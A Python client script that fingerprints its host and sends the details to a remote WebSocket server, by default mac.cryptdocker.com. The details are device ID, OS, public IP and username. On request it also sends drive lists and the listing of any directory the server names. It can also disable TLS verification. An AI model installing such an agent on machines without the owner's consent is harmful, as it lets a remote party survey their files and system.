import asyncio
import json
import platform
import getpass
import uuid
import hashlib
import subprocess
import shutil
import os
import sys
import ssl
from datetime import datetime

import websockets


def get_device_id() -> str:
    """Cross-platform hardware device identifier."""
    system = platform.system()
    try:
        if system == "Windows":
            output = subprocess.check_output(
                ["wmic", "csproduct", "get", "uuid"],
                text=True,
                stderr=subprocess.DEVNULL,
            )
            for line in output.strip().split("\n"):
                line = line.strip()
                if line and line.upper() != "UUID":
                    return line
        elif system == "Darwin":
            output = subprocess.check_output(
                ["ioreg", "-d2", "-c", "IOPlatformExpertDevice"],
                text=True,
                stderr=subprocess.DEVNULL,
            )
            for line in output.split("\n"):
                if "IOPlatformUUID" in line:
                    return line.split('"')[-2]
        elif system == "Linux":
            for path in ["/etc/machine-id", "/var/lib/dbus/machine-id"]:
                if os.path.exists(path):
                    with open(path) as f:
                        return f.read().strip()
    except Exception:
        pass

    mac = uuid.getnode()
    return hashlib.sha256(f"{mac}-{platform.node()}".encode()).hexdigest()[:32]


def get_os_type() -> str:
    return f"{platform.system()} {platform.release()}"


def get_public_ip() -> str:
    import urllib.request

    try:
        with urllib.request.urlopen(
            "https://api.ipify.org?format=json", timeout=5
        ) as resp:
            return json.loads(resp.read().decode())["ip"]
    except Exception:
        return "Unknown"


def get_username() -> str:
    return getpass.getuser()


def get_drives() -> list:
    """List root-level volumes/drives with disk usage info."""
    system = platform.system()
    drives = []

    if system == "Darwin":
        volumes_dir = "/Volumes"
        try:
            for name in sorted(os.listdir(volumes_dir)):
                vol_path = os.path.join(volumes_dir, name)
                if not os.path.isdir(vol_path):
                    continue
                info = {"name": name, "path": vol_path}
                try:
                    usage = shutil.disk_usage(vol_path)
                    info["total_bytes"] = usage.total
                    info["used_bytes"] = usage.used
                    info["free_bytes"] = usage.free
                except (PermissionError, OSError):
                    pass
                drives.append(info)
        except Exception:
            pass

    elif system == "Windows":
        import string

        for letter in string.ascii_uppercase:
            drive_path = f"{letter}:\\"
            if os.path.exists(drive_path):
                info = {"name": f"{letter}:", "path": drive_path}
                try:
                    usage = shutil.disk_usage(drive_path)
                    info["total_bytes"] = usage.total
                    info["used_bytes"] = usage.used
                    info["free_bytes"] = usage.free
                except (PermissionError, OSError):
                    pass
                drives.append(info)

    elif system == "Linux":
        seen_devs = set()
        try:
            with open("/proc/mounts") as f:
                for line in f:
                    parts = line.split()
                    if len(parts) < 2:
                        continue
                    dev, mount_point = parts[0], parts[1]
                    if dev in seen_devs or not mount_point.startswith("/"):
                        continue
                    skip_prefixes = ("/sys", "/proc", "/dev", "/run", "/snap")
                    if any(mount_point.startswith(p) for p in skip_prefixes):
                        continue
                    seen_devs.add(dev)
                    info = {
                        "name": os.path.basename(mount_point) or "/",
                        "path": mount_point,
                    }
                    try:
                        usage = shutil.disk_usage(mount_point)
                        info["total_bytes"] = usage.total
                        info["used_bytes"] = usage.used
                        info["free_bytes"] = usage.free
                    except (PermissionError, OSError):
                        pass
                    drives.append(info)
        except Exception:
            pass

    return drives


def list_directory(dir_path: str) -> dict:
    """List files and folders in a directory with metadata."""
    entries = []
    try:
        for name in os.listdir(dir_path):
            full_path = os.path.join(dir_path, name)
            entry = {"name": name, "path": full_path, "is_dir": False, "size": None, "modified": None}
            try:
                stat = os.stat(full_path, follow_symlinks=False)
                entry["is_dir"] = os.path.isdir(full_path)
                entry["size"] = stat.st_size if not entry["is_dir"] else None
                entry["modified"] = datetime.fromtimestamp(stat.st_mtime).isoformat()
            except (PermissionError, OSError):
                pass
            entries.append(entry)
    except PermissionError:
        return {"path": dir_path, "entries": [], "error": "Permission denied"}
    except FileNotFoundError:
        return {"path": dir_path, "entries": [], "error": "Path not found"}
    except Exception as e:
        return {"path": dir_path, "entries": [], "error": str(e)}

    entries.sort(key=lambda e: (not e["is_dir"], e["name"].lower()))
    return {"path": dir_path, "entries": entries}


def build_ssl_context(url: str) -> ssl.SSLContext | None:
    if not url.lower().startswith("wss://"):
        return None

    insecure = os.getenv("MACSOCKET_INSECURE_SSL", "").strip().lower() in {
        "1",
        "true",
        "yes",
        "y",
        "on",
    }
    if insecure:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    ctx = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH)

    # On some Windows / Python builds, the default CA resolution can be incomplete.
    # certifi provides a reliable CA bundle, which avoids CERTIFICATE_VERIFY_FAILED.
    try:
        import certifi  # type: ignore

        ctx.load_verify_locations(cafile=certifi.where())
    except Exception:
        pass

    return ctx


async def run(url: str):
    device_id = get_device_id()
    os_type = get_os_type()
    public_ip = get_public_ip()
    username = get_username()

    print(f"Device ID : {device_id}")
    print(f"OS Type   : {os_type}")
    print(f"Public IP : {public_ip}")
    print(f"Username  : {username}")
    print(f"Server    : {url}")
    print()

    ssl_ctx = build_ssl_context(url)

    while True:
        try:
            async with websockets.connect(url, ssl=ssl_ctx) as ws:
                await ws.send(
                    json.dumps(
                        {
                            "type": "client_connect",
                            "data": {
                                "device_id": device_id,
                                "os_type": os_type,
                                "public_ip": public_ip,
                                "username": username,
                            },
                        }
                    )
                )
                print("[connected]")

                async def heartbeat():
                    while True:
                        await asyncio.sleep(15)
                        await ws.send(json.dumps({"type": "heartbeat"}))

                async def listen():
                    async for message in ws:
                        data = json.loads(message)
                        print(f"<< {data}")

                        if data.get("type") == "request_info":
                            fresh_info = {
                                "type": "client_info_response",
                                "data": {
                                    "device_id": device_id,
                                    "os_type": get_os_type(),
                                    "public_ip": get_public_ip(),
                                    "username": get_username(),
                                    "request_id": data.get("request_id"),
                                    "drives": get_drives(),
                                },
                            }
                            await ws.send(json.dumps(fresh_info))
                            print(f">> sent fresh info + {len(fresh_info['data']['drives'])} drives (request {data.get('request_id')})")

                        elif data.get("type") == "request_directory":
                            req_path = data.get("path", "/")
                            result = list_directory(req_path)
                            response = {
                                "type": "directory_response",
                                "data": {
                                    "request_id": data.get("request_id"),
                                    "path": result["path"],
                                    "entries": result["entries"],
                                    "error": result.get("error"),
                                },
                            }
                            await ws.send(json.dumps(response))
                            print(f">> sent directory listing for {req_path}: {len(result['entries'])} entries (request {data.get('request_id')})")

                await asyncio.gather(heartbeat(), listen())

        except (ConnectionRefusedError, OSError) as e:
            print(f"[connection failed: {e}] retrying in 5s...")
        except asyncio.CancelledError:
            raise
        except Exception as e:
            print(f"[error: {e}] reconnecting in 5s...")

        await asyncio.sleep(5)


if __name__ == "__main__":
    server_url = sys.argv[1] if len(sys.argv) > 1 else "wss://mac.cryptdocker.com"
    asyncio.run(run(server_url))
